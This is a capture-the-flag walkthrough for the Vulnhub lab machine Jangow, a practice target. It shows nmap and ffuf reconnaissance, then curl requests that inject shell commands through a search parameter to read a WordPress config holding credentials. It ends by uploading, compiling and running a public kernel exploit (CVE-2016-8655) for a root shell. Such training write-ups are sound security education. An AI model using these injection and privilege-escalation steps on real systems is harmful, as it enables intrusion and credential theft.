---
title: CTF Walkthrough for Vulnhub Machine Jangow
category: [Walkthrough, CTF]
tags: [vulnhub, writeup, jangow, machines, command injection, kernel exploit]   
image:
  path: /assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/box-jangow.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Jangow an easy machine among Vulnhub machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Jangow<br>
Goal: Get two flags<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Download link: [Jangow](https://download.vulnhub.com/jangow/jangow-01-1.0.1.ova)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance
We can't attack what we don't know so we first need to identify our target on the network. I used Nmap to carry a host discovery scan to identify all the live hosts on the network.
```bash
nmap -sn 10.0.2.15/24
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/hosts-dis.png)

After identifying the target, we can proceed by performing a service scan on the target.
```bash
sudo nmap -sV -sC -n  10.0.2.8 -oN services-dis.nmap
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/services-dis.png)

From the result obtained, we can see the target runs an FTP and an Apache web server. Since anonymous login is not available on the FTP server let's visit the web application
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/first-browse.png)

We can see the directory **site** clicking on it gives us a fully interactive web application.
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/second-browse.png)

The web application looks normal. When we navigate through the website using the navigation bar we see that the element named Buscar redirects us to a busque.php page which accepts an argument named buscar.
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/buscar-navigation.png)

This is an uncommon word for me so I did a quick Google search and realised that buscar is a Portuguese word that can be translated as 'search for' in English. From the translation of the word buscar we can deduce that this php page has a search functionality. Let's fuzz for all search terms available on the page.
```bash
ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.8/site/busque.php?buscar=FUZZ -fs 1
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/value-fuzzing.png)

## Exploitation

We can notice that all these search terms are common command line commands. We can try the common command ```id``` and we can see that it is executed by the target.
```bash
curl http://<IP addr>/site/busque.php?buscar=id
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/testing-buscar.png)

Since this file executes commands on the target. Instead of directly attempting to obtain a reverse shell we should first of all understand how this file executes commands i.e. if any filter is put in place to filter commands. To do this let's try to read the content of this file.
```bash
curl http://<IP addr>/site/busque.php?buscar=cat%20busque.php
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/busque-analyses.png)

We can see from the content of this file that no filter has been put in place by the administrator of the web application. I tirelessly tried to obtain a reverse shell but it failed this may be due to the presence of egress filters *NB: Egress filtering is the practice of monitoring and potentially restricting the flow of information outbound from one network to another.* Since we can't obtain a reverse shell we can use this webshell to enumerate the system. We can start by listing the content of the current working directory. We can see that this directory contains and interesting directory named wordpress. When we list the content of the wordpress directory we see a configuration file that contains credentials for the user jangow01.
```bash
curl http://<IP addr>/site/busque.php?buscar=ls
curl http://<IP addr>/site/busque.php?buscar=ls+wordpress
curl http://<IP addr>/site/busque.php?buscar=cat+wordpress%2fconfig.php
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/file-enum-1.png)

We can use this credential to log in to the FTP server as shown below
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/ftp-connect.png)

Since we can't obtain a reverse shell let's access the machine and log in using the credentials we discovered above.
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/user-auth-1.png){: .center}

This access gives us the ability to read the user flag on the system and continue our enumeration process.
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/user-flag.png)

## Post Exploitation

I tried several manual enumeration techniques and at the end, I enumerated the kernel version to see if the was any public exploit available.<br>
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/kernel-version.png){: .center}

Looking online we can see that this specific kernel version appears to be vulnerable to CVE-2016-8655. Let's download the [POC](https://www.exploit-db.com/exploits/47170) of this exploit and upload it to our target.
```bash
wget https://www.exploit-db.com/download/47170
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/download-exploit.png)

We can now upload this POC to the target using the FTP service it runs. Upon testing the FTP service run by our target we can discover that path traversal is enabled, hence we can move to the **/tmp** directory and upload the exploit's POC.
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/exploit-upload.png)
*NB: In case path traversal was not enabled we could grant our self-writing privilege on a directory in the web root directory and upload the POC in that directory using FTP.*

Once we upload the POC to our target we can compile it using the inbuilt gcc on our target. The instructions on how to compile this POC are in the comments.
```bash
gcc 47170.c -o poc -lpthread
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/compile-exploit.png){: .center}

After compiling the POC we can run it and we shall obtain a shell a the root user. 
```bash
./poc
```
![](/assets/img/posts/walthrough/vulnhub/2024-09-10-jangow/root-shell.png){: .center}
Great, with this access, we owned the machine and we can read the root flag found in the root directory.

## Conclusion
Congratulations! In this walkthrough, you have used your enumeration skills to enumerate across the system to find credentials and then used these credentials to log in as a normal user. Finally, you successfully exploited a kernel vulnerability to obtain root access to the target system. This machine demonstrates how poor maintenance of updates can significantly impact an organisation's security posture. Thank you for following up on this walkthrough.









